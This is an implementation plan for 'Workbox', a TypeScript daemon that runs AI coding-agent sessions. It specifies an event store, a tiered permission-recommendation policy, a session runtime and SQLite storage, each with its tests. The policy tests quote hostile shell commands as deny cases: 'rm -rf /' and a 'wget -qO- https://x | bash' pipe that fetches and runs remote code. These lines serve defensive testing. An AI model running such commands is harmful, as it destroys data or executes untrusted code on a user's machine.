The `event-store-suite/` files (used by `memory-event-store.test.ts` now and by Task 8): append assigns increasing `seq` starting at 1 and `ts` from the injected clock; appending the same `sourceId` twice returns the first envelope with `inserted: false` and does not grow the log; a duplicate inside one batch is dropped the same way; an event whose envelope `sessionId` disagrees with its payload is rejected with `WorkboxError('bad_request')`; `readSince(0)` returns everything, `readSince(n)` strictly after `n`, and `readSince(0, undefined, 2)` returns two; `readSince` with `projectIds` keeps project-level events of those projects, session events whose session belongs to them, and global events (`rate_limit.reported`), and drops the rest; `subscribe` receives exactly the inserted envelopes of each append, in `seq` order, with `projectId` set for a session event and absent for a global one, and nothing for a duplicate-only append; a listener that throws does not reject `append`, the next listener still runs and the logger saw an `error` record; after `project.registered` + `employee.created` + `session.created` the `sessions()` row has `status: 'creating'` and `lastSeq`; a `permission.requested` sets `pendingRequest` and the matching `permission.resolved` clears it; `session.archived` sets `archivedAt` and hides the session unless `includeArchived`; `project.removed` hides the project unless `includeRemoved` and keeps its sessions readable; `record`/`lookup` round-trip a `BlobMeta` and `lookup` of an unknown hash is `undefined`. `projection-state.test.ts` covers `projectIdOf` for one event per group. `source-ids.test.ts` pins the four formats.

- [ ] **Step 2: Implement, check, commit**

`packages/core/.oxlintrc.json` extends the root, copies protocol's `no-restricted-globals` and `no-restricted-imports` rules and its `test/**` override, and adds an override `{ "files": ["src/testing/**"], "rules": { "max-lines-per-function": "off", "max-statements": "off", "no-magic-numbers": "off", "no-restricted-imports": ["error", { "patterns": [{ "group": ["bun:*", "!bun:test", "node:*"], "message": "core testing helpers may import bun:test only" }] }] } }`; both halves are verified (evidence above): under it `bun:sqlite` and `node:path` are still reported in `src/testing/` while `bun:test` passes and an 18-case suite draws no `no-magic-numbers`, `max-statements` or `max-lines-per-function` report, and `bun:test` and numeric literals stay banned in the rest of `src/`. ADR 0005 ledger rows: `no-restricted-globals`/`no-restricted-imports` opt-in for `packages/core` ("`core` must stay runtime-neutral like `protocol`"), and the `src/testing/**` override ("the shared store suite and the test doubles that adapters import from `@workbox/core/testing` are test code: they need `bun:test` and the three relaxations the root grants `*.test.ts`", Decision 17). `bun test` with coverage ≥ 90 %; `pnpm run check` (also `pnpm run boundaries` must pass with the `core` tag). Commit:

```bash
git add packages/core knip.jsonc pnpm-lock.yaml docs/adr
git commit -s -m "feat(core): add the domain, the ports, an in-memory event store and the store suite"
```

(`pnpm install` adds the workspace package to the lockfile.)

---

### Task 5: Core: recommendation policy and branch slugs

**Files:**
- Create: `packages/core/src/policy.ts`, `packages/core/src/slug.ts`
- Create: tests `packages/core/test/policy.test.ts`, `packages/core/test/slug.test.ts`
- Modify: `packages/core/src/index.ts`

**Interfaces:**
- Produces: `READ_ONLY_TOOLS = ['Read', 'Glob', 'Grep', 'LS']` and `EDIT_TOOLS = ['Edit', 'Write', 'MultiEdit', 'NotebookEdit']`; `describeToolInput(name, input): ToolInputFacts` where `ToolInputFacts = { readonly command?: string; readonly targetPaths: readonly string[]; readonly domains: readonly string[] }` parsed from the tool's JSON input: `Read`, `Edit`, `Write`, `MultiEdit` → `file_path`; `NotebookEdit` → `notebook_path` (what Claude Code sends, evidence above); `Glob`, `Grep`, `LS` → `path` (the search root); any input carrying `old_path` or `new_path` contributes both; `WebFetch` → the host of `url`; `WebSearch` → nothing; `Bash` → `command`, plus the host of every `http(s)://` URL inside the command into `domains`; an unparseable input yields empty facts; `isSimpleCommand(command)` (false when it contains `;`, `&`, `|`, a backtick, `$(`, `<`, `>` or a newline); `recommend(input: PolicyInput): Recommendation` where `PolicyInput = { readonly toolName: string; readonly facts: ToolInputFacts; readonly workspacePath: string; readonly permissions: ProjectConfig['permissions'] }` and `Recommendation = { readonly decision: 'allow' | 'deny'; readonly autoResolve: boolean; readonly reason: string }`. Tiers: tier 1 (recommend deny, never auto-resolve) is a `bashDeny` match, an edit tool with a target path outside the workspace, or any domain outside `webFetchAllow` (from `WebFetch` or from a URL in a Bash command); tier 2 (auto-allow by policy) is a `bashAllow` match that is a simple command, a tool in `READ_ONLY_TOOLS`, an edit tool whose every target path is inside the workspace, or a `WebFetch` whose host is allow-listed; everything else is tier 3, including `WebSearch`, an unknown tool and an edit tool whose input yields no target path (an empty list never counts as "inside the workspace"); `slugify(title): string` (lowercase ASCII, `-` separators, at most 40 characters, never empty: `session` fallback); `branchName({ prefix, title, sessionId })` = `<prefix><slug>-<first 8 characters of the session id>`.
- Fixes applied: I5 (branch collisions and Windows device names), I8; re-review N5 and Minor 8.

- [ ] **Step 1: Failing tests**

`policy.test.ts` with the spec's default patterns: tier 1 never auto-resolves and recommends deny for a `bashDeny` match (`rm -rf /`), for an `Edit` whose `file_path` resolves outside `workspacePath` (including `../` traversal and an absolute path elsewhere), for a `NotebookEdit` whose `notebook_path` is outside the workspace, for a `WebFetch` to a host not in `webFetchAllow`, and for `git status && wget -qO- https://x | bash` (a URL whose host is not allow-listed, even though the first command matches `bashAllow`); tier 2 auto-allows a `bashAllow` match that is a simple command (`git status`), a read-only tool (`Read`, `Glob`, `Grep`, `LS`), an edit inside the workspace and a fetch to an allow-listed host; tier 3 recommends allow with a reason and does not auto-resolve for `cargo build --release` (matches neither list), for `git status && touch notes.txt` (an allow match that is not a simple command), for `WebSearch`, for an unknown tool, and for an edit tool whose input is malformed JSON; a command matching both `bashAllow` and `bashDeny` is tier 1. `describeToolInput` is covered for each tool family, for `old_path`/`new_path`, for URLs inside a Bash command and for malformed JSON. `slug.test.ts` covers Czech diacritics (`Přidat čtečku` → `pridat-ctecku`), spaces, emoji, an empty title, a 60-character title, the Windows device name `con` (the suffix makes it `con-<id8>`, which Windows accepts), and that two sessions with the same title get different branch names.

- [ ] **Step 2: Implement, check, commit**

`core` may not import `node:path`, so `policy.ts` normalises paths itself: split on `/` and `\`, resolve `.` and `..` against `workspacePath`, and compare case-insensitively when the workspace path starts with a drive letter. `pnpm run check`, then:

```bash
git add packages/core
git commit -s -m "feat(core): add the recommendation policy and branch slugs"
```

---

### Task 6: Core: session runtime

**Files:**
- Create: `packages/core/src/session-runtime.ts`, `packages/core/src/employee-config.ts` (`toEmployeeRuntimeConfig(employee, config): EmployeeRuntimeConfig`, the employee's fields over the `harness.claude` defaults), `packages/core/src/testing/scripted-harness.ts` (a `HarnessAdapter` whose session emits a programmed list of sink calls when prompted and resolves permissions and questions on demand; records `start()` specs), `packages/core/src/testing/fake-sandbox.ts` (a `SandboxProvider` that records `prepare`/`spawn`/`dispose`/`environment` calls, returns a workspace under a fake home and a configured env, and can be told to reject `prepare` or to hold it on a deferred promise)
- Create: tests `packages/core/test/session-runtime.test.ts` (prepare, prompt, queue, interrupt, stop), `packages/core/test/session-runtime-decisions.test.ts` (permissions, questions, policy, snapshot), `packages/core/test/session-runtime-resume.test.ts` (`ensureHarness`, `shutdown`), `packages/core/test/employee-config.test.ts` (one file per concern keeps each under 300 lines)
- Modify: `packages/core/src/index.ts`, `packages/core/src/testing/index.ts`

**Interfaces:**
- Produces: `createSessionRuntime(deps: SessionRuntimeDeps): SessionRuntime` with `SessionRuntimeDeps = { readonly session: Session; readonly project: Project; readonly employee: Employee; readonly config: ProjectConfig; readonly store: EventStore; readonly adapter: HarnessAdapter; readonly sandbox: SandboxProvider; readonly clock: Clock; readonly ids: IdGenerator; readonly logger: Logger; readonly onTransient: (frame: TransientFrame) => void }` and

```ts
export interface SessionRuntime {
  /** Starts preparation in the actor and returns at once; events follow. `firstTurn` is prompted when `idle` is reached. */
  readonly prepare: (input: { readonly source: CommandSource; readonly firstTurn?: TurnRequest }) => void;
  readonly prompt: (input: { readonly source: CommandSource; readonly turn: TurnRequest }) => Promise<{ readonly turnId: Id }>;
  readonly resolvePermission: (input: { readonly source: CommandSource; readonly requestId: string; readonly decision: PermissionDecision; readonly decidedBy: DecidedBy }) => Promise<void>;
  readonly answerQuestion: (input: { readonly source: CommandSource; readonly requestId: string; readonly answer: QuestionAnswer; readonly decidedBy: DecidedBy }) => Promise<void>;
  readonly interrupt: (input: { readonly source: CommandSource; readonly reason: string }) => Promise<void>;
  readonly stop: (input: { readonly source: CommandSource; readonly reason: string }) => Promise<void>;
  /** Starts a harness session for an existing session when none is held (after a restart or a `stop`), reading the current `Session` row from the store; the runtime calls it before a turn starts, tests call it directly. */
  readonly ensureHarness: () => Promise<void>;
  /** Daemon shutdown or restart recovery: drains the actor chain, stops a held harness session and idles or fails the session with a `system:` key. */
  readonly shutdown: (input: { readonly reason: string }) => Promise<void>;
  readonly snapshot: () => PartialSnapshot | undefined;
  readonly status: () => SessionStatus;
}
```

with `TurnRequest = { readonly prompt: string; readonly attachmentIds: readonly string[] }` and `CommandSource` from Task 4 (`userSource(commandId)`), so that the Workbox and the runtime share one `user:<commandId>:<n>` counter per command.
- Behaviour (the contract Tasks 7, 10 and 13 rely on):
  - One actor per session: every command and every sink event is queued on one promise chain, so transitions never interleave. Awaiting `HarnessSession.prompt()` inside the chain is safe because it resolves on acceptance (Task 4's port contract), never at turn end (I3).
  - `prepare`: awaits `sandbox.prepare(spec)` (with `branch` from `branchName`) outside the actor chain and enqueues the remaining steps when it settles, so commands that arrive meanwhile run at once (re-review Minor 5): a `stop` during preparation moves `creating → stopped` with no harness to stop, and a `shutdown` moves `creating → failed` without waiting. The continuation proceeds only while the status is still `creating`; from any other status it disposes of the workspace without appending `workspace.prepared` and returns (R2-4). Otherwise it appends `workspace.prepared`, calls `adapter.start(spec, sink)` with `cwd` and `workspace` from the prepared workspace, `employee: toEmployeeRuntimeConfig(employee, config)`, `env` from `PreparedWorkspace.env`, `spawn: sandbox.spawn` and no `resumeId`, appends `prepared` → `idle` (`source.next()`), and prompts the first turn if given. A rejection appends `preparation_failed` → `failed` with the error message as `reason`; when the rejection is a `WorkboxError('sandbox')` whose `details.workspace` names a created worktree (a failing setup command, Task 9b), the runtime first appends `workspace.prepared` with that workspace and the `setupCommandResults` so far, so the session has a `workspace` that `session ls` shows and `archive` removes (R2-2).
  - `ensureHarness`: when a prompt or a queued turn finds no harness session, the runtime reads the current row with `store.session(sessionId)` (not the `Session` captured in `SessionRuntimeDeps`, which for a session created in this daemon run predates `workspace.prepared` and `harness.bound`; R2-1) and calls `adapter.start()` with `cwd` and `workspace` from that row's `workspace`, `employee: toEmployeeRuntimeConfig(employee, config)`, `env: sandbox.environment(config.env.passthrough)`, `spawn: sandbox.spawn` and `resumeId` from that row's `harnessSessionId` when it is set. This covers a runtime created lazily after a daemon restart and a session that was stopped in this run (the table allows `stopped → running`). A row without a workspace (the worktree was never created) rejects the prompt with `WorkboxError('invalid_transition', 'the session has no workspace; create a new session')`. Plan 2's fake adapter continues with its next scenario turn for a `resumeId` it knows (Task 10); plan 4 adds the Claude side (Decision 20).
  - `shutdown({ reason })`: waits for the actor chain to drain, calls `session.stop()` when a harness session is held and drops it, then appends one status change with a `system:<ids.next()>` key: `interrupt` → `idle` from `running` or `waiting_*`, `preparation_failed` → `failed` from `creating`, and nothing from any other status; queued turns are discarded. An in-flight `sandbox.prepare` is not awaited: its continuation finds `failed` and disposes of the workspace (R2-4). `Workbox.shutdown()`, `recoverAfterRestart()` and `archive()` (reason `archived`, before the worktree is removed, R2-3) call it (Task 7).
  - `prompt`: when the status accepts `prompt`, the runtime calls `ensureHarness()` if no harness session is held, appends `turn.started` (`turnId` from `ids`, `queuedAt` from the clock) plus the status change in one batch and calls `session.prompt()`; while `running` or `waiting_*` the turn is queued in memory (Decision 21) and starts after the current turn ends; the ack carries the `turnId` either way. A prompt for a session in `creating` is queued as the first turn. `interrupt` and `stop` discard the queue and log the discarded `turnId`s at `info`; after `turn.failed` the next queued turn starts.
  - Sink events: `permission.requested` is rewritten first: `recommended` and `reason` come from `recommend()` applied to `describeToolInput(name, input)` (the option whose id equals the decision; the adapter's value stays when no option matches). A tier-2 result appends `permission.requested` and `permission.resolved { decidedBy: 'policy', latencyMs: 0 }` in one batch with no status change (Minor 19) and calls `session.resolvePermission`. Otherwise the event and `<sourceId>#status` → `waiting_for_permission` are appended together. `question.asked` → `waiting_for_answer`; `turn.completed` → `completed`; `turn.failed` → `failed` (from `running` or `waiting_*`); other harness events are appended as they come. An invalid transition is logged at `warning` and the event is still appended.
  - `resolvePermission`/`answerQuestion`: `not_found` when the pending request id differs; otherwise append the resolution with `latencyMs` from the clock and the status change, then forward to the harness session. No timer runs for a pending question in plan 2: the auto-select timeout of spec 6.3 is plan 3's (Decision 16), and `decidedBy: 'timeout'` is reserved for it.
  - `interrupt`: `session.interrupt()` then `interrupt` → `idle`; `stop`: `session.stop()` then `stop` → `stopped`; the runtime keeps the harness session object between turns (one process per session, spec 6.2) and drops it on `stop`; `ensureHarness` starts a new one on the next prompt.
  - Transient frames are forwarded to `onTransient` and never stored; `message.delta` text accumulates in the partial (`turnId`, `messageId`, `text`, `thinking`), which `message.completed` with the same `messageId` or any turn end clears.
- Fixes applied: I3 (lifecycle and the resume seam), I7 (keys), I8 (policy wiring), Minor 19; re-review N4 and Minors 5, 6 and 11.

- [ ] **Step 1: Failing tests**

All three runtime test files use the scripted adapter, the fake sandbox and the memory store. `session-runtime.test.ts`: `prepare` appends `workspace.prepared`, calls `start()` with `cwd` equal to the workspace path, `env` from `PreparedWorkspace.env` and no `resumeId`, appends `creating → idle` with the next id of the source the test passes (`user:<commandId>:3` when the test's source already issued `:1` for `session.created` and the runtime used `:2` for `workspace.prepared`), and prompts the first turn; a `prepare` rejection yields `failed` with the reason, and a rejection whose `details.workspace` names a worktree appends `workspace.prepared` with the partial results before `failed`; `stop` while the fake sandbox holds `prepare` on a deferred promise is applied at once (`creating → stopped`), and when the promise resolves `dispose` is called, `workspace.prepared` is not appended and `start()` is never called; `shutdown` while `prepare` is held appends `preparation_failed → failed` at once, and the continuation then disposes of the workspace and starts nothing; a prompt appends `turn.started` with `queuedAt`, moves to `running`, stores the scripted events with `source: 'harness'` and the adapter's `sourceId`s and ends `completed`; a second prompt while running is queued and starts after `turn.completed` with its own `turnId`; `interrupt` with a queued turn discards it and the log names its `turnId`; after `turn.failed` a queued turn starts; a prompt after `failed` works again. `session-runtime-decisions.test.ts`: `permission.requested` with a tier-3 input moves to `waiting_for_permission` with the policy's `recommended`/`reason` replacing the adapter's and sets `pendingRequest`; `resolvePermission` appends `permission.resolved` with `decidedBy` and `latencyMs` from the clock and returns to `running`; a tier-2 input resolves in one batch with `decidedBy: 'policy'` and no status change; a tier-1 input never auto-resolves even when `bashAllow` also matches; `turn.failed` while `waiting_for_permission` yields `failed`; `interrupt` from `waiting_for_answer` yields `idle` and clears `pendingRequest`; transient frames reach `onTransient` and are not stored; `snapshot()` holds the concatenated `message.delta` text and is cleared on `message.completed`. `session-runtime-resume.test.ts`: a runtime created for a stored `idle` session with a workspace and a `harnessSessionId` calls `start()` on the first prompt with that `resumeId`, `cwd` equal to the stored workspace path and `env` equal to what `sandbox.environment(config.env.passthrough)` returned; in one daemon run, `prepare`, a `harness.bound` from the scripted adapter, `stop`, then `prompt` makes `start()` receive the bound id as `resumeId` and the prepared path as `cwd`, proving the runtime read the row rather than its creation-time snapshot; a stored session without a workspace rejects a prompt with `invalid_transition`; `shutdown({ reason })` on a running session stops the harness session and appends `interrupt → idle` with a `system:` key and that reason, on a `creating` session appends `preparation_failed → failed`, on a `completed` session appends nothing, and resolves only after a pending chain link has finished. `employee-config.test.ts`: employee fields override the `harness.claude` defaults and `allowedTools` falls back to the config.

- [ ] **Step 2: Implement, check, commit**

`pnpm run check`, then:

```bash
git add packages/core
git commit -s -m "feat(core): add the session runtime actor"
```

---

### Task 7: Core: the Workbox application service

**Files:**
- Create: `packages/core/src/workbox.ts`, `packages/core/src/employees.ts` (name pool and the default employee; `toEmployeeRuntimeConfig` is Task 6's)
- Create: tests `packages/core/test/workbox.test.ts`, `packages/core/test/employees.test.ts`
- Modify: `packages/core/src/index.ts`

**Interfaces:**
- Produces: `createWorkbox(deps: WorkboxDeps): Workbox` with `WorkboxDeps = { readonly store: EventStore; readonly sandbox: SandboxProvider; readonly adapters: Readonly<Record<HarnessId, HarnessAdapter>>; readonly harnessOverride?: HarnessId; readonly projectConfigs: ProjectConfigSource; readonly clock: Clock; readonly ids: IdGenerator; readonly logger: Logger }` and (every mutating input carries `commandId`):

```ts
export interface Workbox {
  readonly registerProject: (input: { readonly commandId: string; readonly path: string }) => Promise<{ readonly projectId: Id }>;
  readonly listProjects: () => Promise<readonly Project[]>;
  readonly listBranches: (projectId: Id) => Promise<readonly Branch[]>;
  readonly updateProject: (input: { readonly commandId: string; readonly projectId: Id; readonly changes: ProjectChanges }) => Promise<void>;
  readonly updateEmployee: (input: { readonly commandId: string; readonly employeeId: Id; readonly changes: EmployeeChanges }) => Promise<void>;
  readonly createSession: (input: { readonly commandId: string; readonly projectId: Id; readonly employeeId?: Id; readonly title: string; readonly baseBranch: string; readonly prompt: string; readonly attachmentIds: readonly string[] }) => Promise<{ readonly sessionId: Id; readonly employeeId: Id }>;
  readonly listSessions: (filter?: SessionFilter) => Promise<readonly Session[]>;
  readonly prompt: (input: { readonly commandId: string; readonly sessionId: Id; readonly prompt: string; readonly attachmentIds: readonly string[] }) => Promise<{ readonly turnId: Id }>;
  readonly interrupt: (input: { readonly commandId: string; readonly sessionId: Id }) => Promise<void>;
  readonly stop: (input: { readonly commandId: string; readonly sessionId: Id }) => Promise<void>;
  readonly archive: (input: { readonly commandId: string; readonly sessionId: Id }) => Promise<void>;
  readonly resolvePermission: (input: { readonly commandId: string; readonly sessionId: Id; readonly requestId: string; readonly decision: PermissionDecision }) => Promise<void>;
  readonly answerQuestion: (input: { readonly commandId: string; readonly sessionId: Id; readonly requestId: string; readonly answer: QuestionAnswer }) => Promise<void>;
  readonly addAttachment: (input: { readonly sessionId: Id; readonly meta: BlobMeta; readonly origin: 'user' | 'agent' }) => Promise<void>;
  readonly search: (query: string, sessionId?: Id) => Promise<readonly SearchHit[]>;
  readonly snapshots: (filter?: { readonly projectIds?: readonly Id[] }) => readonly PartialSnapshot[];
  readonly subscribeTransient: (listener: (frame: TransientFrame, projectId: Id) => void) => Unsubscribe;
  readonly recoverAfterRestart: () => Promise<void>;
  readonly shutdown: () => Promise<void>;
}
```

`ProjectChanges` and `EmployeeChanges` are `EventPayload<'project.updated'>['changes']` and `EventPayload<'employee.updated'>['changes']`. Every mutating method creates `userSource(commandId)` once and hands it to its own appends and to the runtime, so a `session.create` command's `session.created` is `user:<commandId>:1` and the runtime's `workspace.prepared` is `:2`.
- Behaviour: `registerProject` reads the config through `projectConfigs` (a failed parse → `WorkboxError('bad_request')` with the parser's message), uses `config.defaultBranch` or `sandbox.detectDefaultBranch`, appends `project.registered` and one `employee.created` per configured employee, or one default employee when none is configured, in one batch (`user:<commandId>:<n>`); registering a path already registered → `conflict`. `createSession` re-reads the config, picks the employee (given id, else the project's first employee unless one of its sessions is in `creating`, `running` or `waiting_*`, else a new employee named from the pool `['Alice', 'Bob', 'Eva', 'Jan']` with `<name> 2`, `<name> 3` once exhausted; spec 9.1), appends `session.created` (`employee.created` first when a new employee was needed), creates the runtime, calls `runtime.prepare({ source, firstTurn })` with the command's `CommandSource` and returns `{ sessionId, employeeId }` without waiting for the worktree (I3). The adapter for a runtime is `adapters[harnessOverride ?? employee.harness]` (Decision 9). `addAttachment` appends `attachment.added` with `blobSourceId(sessionId, sha256)`, so the same upload twice yields one event. `archive` on a session in `creating`, `running` or `waiting_*` rejects with `conflict` (stop it first); otherwise it first calls `runtime.shutdown({ reason: 'archived' })` on a live runtime (which stops a held harness session and appends nothing from `idle`, `completed`, `failed` or `stopped`) and drops the runtime, then disposes of the workspace when the session has one and appends `workspace.removed` and `session.archived` in one batch (Decision 18, R2-3); a `dispose` failure rejects with `sandbox` and appends nothing. Commands for a persisted session that has no runtime (after a restart) create one lazily from the stored `Session`, `Project`, `Employee` and config; the runtime's `ensureHarness` then starts the harness with `resumeId` on the first turn (Task 6). `recoverAfterRestart` runs once after the store opens: for every session in `running`, `waiting_*` or `creating` it creates the runtime and calls `runtime.shutdown({ reason: 'daemon restarted' })`, which appends `interrupt → idle` or `preparation_failed → failed` with a `system:<ids.next()>` key, and it appends `harness.auth_status` for every adapter from `authStatus()` (sourceId `system:<ids.next()>`). `shutdown` calls `runtime.shutdown({ reason: 'daemon stopped' })` on every live runtime, which stops the harness sessions and idles or fails the sessions, and resolves when every call has resolved. `snapshots` collects `runtime.snapshot()` from live runtimes, filtered by project. `subscribeTransient` fans out the runtimes' `onTransient` with the session's project id.
- Fixes applied: C1 (snapshots and transient fan-out), C2 (lists), I3 (recovery, shutdown, acknowledgement), I4 (config source), I9 (harness selection), Minor 23 (employee choice); re-review I3 (resume), N4 and Minors 9 and 14.

- [ ] **Step 1: Failing tests**

`workbox.test.ts` with the fake sandbox, the scripted adapter, a stub `ProjectConfigSource` and the memory store: `registerProject` with two configured employees appends `project.registered` and two `employee.created` with the config's names; with none configured one `Alice`; a config with an unknown key → `bad_request` naming the key; the same path twice → `conflict`; `createSession` resolves `{ sessionId }` while the session is still `creating` and the fake sandbox's `prepare` has not resolved, and after it resolves the events `workspace.prepared`, `creating → idle` and `turn.started` appear in that order; a `prepare` rejection ends `failed`; `createSession` without `employeeId` on a project whose only employee is busy creates `Bob`; `recoverAfterRestart` on a store seeded with a `running`, a `waiting_for_permission` and a `creating` session appends the three status changes with the stated reason and `system:` keys and `harness.auth_status` for the fake adapter; `shutdown` stops the scripted harness session and idles a running session with reason `daemon stopped`; `archive` of a `completed` session whose runtime still holds a harness session stops that harness session first, disposes of its workspace and appends `workspace.removed` then `session.archived`, and `archive` of a `running` session rejects with `conflict`; `snapshots()` returns the partial of a mid-turn session and filters by project; `subscribeTransient` delivers a frame with the right project id; a prompt for a persisted `idle` session without a runtime (new `Workbox` over the same store) calls `start()` with `resumeId` and the env from `sandbox.environment`. `employees.test.ts` covers the default employee and the pool exhaustion.

- [ ] **Step 2: Implement, check, commit**

`pnpm run check`, then:

```bash
git add packages/core
git commit -s -m "feat(core): add the Workbox application service with recovery and shutdown"
```

---

### Task 8: SQLite event store

**Files:**
- Create: `packages/store-sqlite/{package.json,turbo.json,tsconfig.json}` (tag `adapter`), `src/index.ts`, `src/migrations.ts`, `src/sqlite-event-store.ts`, `src/rows.ts`
- Create: tests `test/sqlite-event-store.test.ts` (runs `describeEventStore` from `@workbox/core/testing` on a file database and on `:memory:`), `test/migrations.test.ts`, `test/fts.test.ts`
- Modify: `knip.jsonc`, `pnpm-lock.yaml`, `project-words.txt` (`materialised` if used in comments)

**Interfaces:**
- Produces: `openSqliteEventStore({ path, clock, logger }): SqliteEventStore` where `SqliteEventStore extends EventStore, BlobIndex` (`path` may be `:memory:`), `MIGRATIONS: readonly Migration[]` (`{ version, name, sql }`), `applyMigrations(db)`, `SCHEMA_VERSION`.
- Fixes applied: C1 (notification), I4 (blob index), I6 (`project_id` column), I7 (`inserted`, session id check), Minor 16, 20.

- [ ] **Step 1: Failing tests**

`migrations.test.ts`: a new database ends at `SCHEMA_VERSION` with `PRAGMA user_version` equal to it, running again is a no-op, versions are contiguous from 1, and the database is in WAL mode (`PRAGMA journal_mode` returns `wal` for a file database; `memory` for `:memory:`). `sqlite-event-store.test.ts` runs the shared suite (its factory opens the store with `createRecordingLogger()` and returns `{ store, clock, logger, cleanup }`), plus: two stores on the same file see each other's appends (the second connection reads `lastSeq`), only the connection that appended notifies its listeners (cross-process notification is out of scope: one daemon per home), `readSince` with `projectIds` uses the `project_id` column (a session event stored before its project filter is asked for is still found), and a corrupted payload row fails `readSince` with `WorkboxError('internal')` naming the `seq`. `fts.test.ts`: after `message.completed` events, `search('workbox')` returns hits whose `snippet` wraps the match in `SEARCH_HIGHLIGHT_START`/`SEARCH_HIGHLIGHT_END` and contains no `<mark>`, a body containing `<script>` comes back with the tag intact as text between markers (the client renders segments as text), results are scoped by `sessionId`, and an FTS5 syntax error in the query (`"unbalanced`) yields an empty result instead of throwing (the query is quoted as a phrase).

- [ ] **Step 2: Implement**

`migrations.ts` embeds SQL strings; version 1:

```sql
CREATE TABLE events (
  seq INTEGER PRIMARY KEY AUTOINCREMENT,
  session_id TEXT,
  project_id TEXT,
  type TEXT NOT NULL,
  v INTEGER NOT NULL,
  payload TEXT NOT NULL,
  ts TEXT NOT NULL,
  source TEXT NOT NULL,
  source_id TEXT NOT NULL UNIQUE
);
CREATE INDEX events_session_seq ON events(session_id, seq);
CREATE INDEX events_project_seq ON events(project_id, seq);
CREATE TABLE projects (id TEXT PRIMARY KEY, name TEXT NOT NULL, path TEXT NOT NULL, default_branch TEXT NOT NULL, created_at TEXT NOT NULL, updated_at TEXT NOT NULL, removed_at TEXT);
CREATE TABLE employees (id TEXT PRIMARY KEY, project_id TEXT NOT NULL REFERENCES projects(id), data TEXT NOT NULL, created_at TEXT NOT NULL, updated_at TEXT NOT NULL);
CREATE TABLE sessions (id TEXT PRIMARY KEY, project_id TEXT NOT NULL REFERENCES projects(id), employee_id TEXT NOT NULL, title TEXT NOT NULL, base_branch TEXT NOT NULL, workspace_path TEXT, workspace_branch TEXT, status TEXT NOT NULL, harness_session_id TEXT, pending_request_id TEXT, pending_request_kind TEXT, last_seq INTEGER NOT NULL, created_at TEXT NOT NULL, updated_at TEXT NOT NULL, archived_at TEXT);
CREATE INDEX sessions_project ON sessions(project_id, archived_at);
CREATE VIRTUAL TABLE messages_fts USING fts5(message_id UNINDEXED, session_id UNINDEXED, body);
CREATE TABLE blobs (sha256 TEXT PRIMARY KEY, mime TEXT NOT NULL, bytes INTEGER NOT NULL, name TEXT NOT NULL, created_at TEXT NOT NULL);
```

`applyMigrations` runs each migration above `PRAGMA user_version` inside `db.transaction(...).immediate()` and sets `user_version` at the end of each; it first asserts FTS5 by running `CREATE VIRTUAL TABLE temp.fts5_probe USING fts5(x)` followed by `DROP TABLE temp.fts5_probe`, and throws a `WorkboxError('internal')` naming the SQLite version (`SELECT sqlite_version()`) if that fails. `openSqliteEventStore` opens with `{ strict: true, create: true }`, sets `PRAGMA journal_mode = WAL`, `PRAGMA busy_timeout = <BUSY_TIMEOUT_MS>` (5000), `PRAGMA foreign_keys = ON`, applies migrations, and implements `append` as one immediate transaction: validate each input with `newEventSchema` (a failure → `WorkboxError('bad_request')` before anything is written), compute `project_id` with `projectIdOf` against the current tables, `INSERT OR IGNORE` by `source_id`, read the row back (`inserted` is whether `changes()` was 1), apply `applyProjection` to the `projects`/`employees`/`sessions` rows for inserted events, and insert the text blocks of an inserted `message.completed` into `messages_fts`; after the transaction commits, call every listener once with the inserted envelopes in `seq` order (synchronously, before `append` resolves); a listener that throws is logged at `error` and neither rejects `append` nor stops the other listeners. `search` uses `snippet(messages_fts, 2, <start marker>, <end marker>, '…', <SNIPPET_TOKENS>)` with the two protocol markers and the query wrapped in double quotes as a phrase; `BlobIndex` reads and writes the `blobs` table. Rows are validated with Zod (`rows.ts`) when read, so a corrupted payload fails loudly; NULL columns become absent fields with `?? undefined`.

- [ ] **Step 3: Check and commit**

`bun test` in `packages/store-sqlite` green; `pnpm run check`, then:

```bash
git add packages/store-sqlite knip.jsonc pnpm-lock.yaml project-words.txt
git commit -s -m "feat(store-sqlite): add the SQLite event store with embedded migrations and FTS5 search"
```

---

### Task 9a: Process package: the shared command runner and shell commands

**Files:**
- Create: `packages/process/{package.json,turbo.json,tsconfig.json}` (tag `process`), `src/index.ts`, `src/shell.ts`
- Move: `apps/cli/src/process/command-runner.ts` → `packages/process/src/command-runner.ts`, `apps/cli/src/process/pipe-collector.ts` → `packages/process/src/pipe-collector.ts`, `apps/cli/test/command-runner.test.ts` and `apps/cli/test/pipe-collector.test.ts` → `packages/process/test/` (imports adjusted; the tests pass unchanged otherwise)
- Create: tests `packages/process/test/shell.test.ts`, `packages/process/test/command-runner-options.test.ts` (the `RunOptions` cases; `command-runner.test.ts` is already 283 lines and must stay under 300)
- Modify: `apps/cli/src/doctor/checks.ts`, `apps/cli/src/doctor/run-doctor.ts`, `apps/cli/src/commands/doctor.ts`, `apps/cli/test/checks.test.ts`, `apps/cli/test/run-doctor.test.ts` (import `CommandRunner`/`bunCommandRunner` from `@workbox/process`), `apps/cli/package.json` (dependency `@workbox/process`), root `turbo.json` (new tag `process` whose deny list names every other tag; `protocol`, `i18n`, `observability`, `core`, `sim`, `render` and `app-web` add `process` to their deny lists, so only `adapter` and `app-cli` may depend on it), `knip.jsonc`, `pnpm-lock.yaml`, `project-words.txt` (`COMSPEC`), `docs/adr/0005-…md` (tag list: ten tags, `process` depends on no internal package and may be used by `adapter` and `app-cli`)

**Interfaces:**
- Produces: `CommandRunner { readonly run: (command: readonly string[], options?: RunOptions) => Promise<CommandResult> }` with `RunOptions = { readonly cwd?: string; readonly env?: Readonly<Record<string, string>>; readonly timeoutMs?: number; readonly windowsVerbatimArguments?: boolean }` (`timeoutMs` overrides the runner's default for one call and `0` disables the timeout; `windowsVerbatimArguments` reaches `Bun.spawn` and defaults to `false`), `CommandResult` unchanged, `createBunCommandRunner`, `bunCommandRunner`, and `shellCommand(platform, line, env): ShellCommand` with `ShellCommand = { readonly command: readonly string[]; readonly windowsVerbatimArguments: boolean }`: on win32 `{ command: [comspec, '/d', '/s', '/c', `"${line}"`], windowsVerbatimArguments: true }` with `comspec` from `env['COMSPEC']` or `cmd.exe` (the whole line sits in one pair of outer quotes, which `/s` strips, and verbatim arguments keep Bun from re-escaping the inner quotes with backslashes that `cmd.exe` cannot read, evidence above; re-review N3); on POSIX `{ command: ['/bin/sh', '-c', line], windowsVerbatimArguments: false }`.
- The spawn in `command-runner.ts` becomes exactly this, with conditional spreads because `exactOptionalPropertyTypes` forbids `cwd: undefined` against Bun's `cwd?: string`:

```ts
const PIPED_STDIO = { stdin: 'ignore', stdout: 'pipe', stderr: 'pipe' } as const;

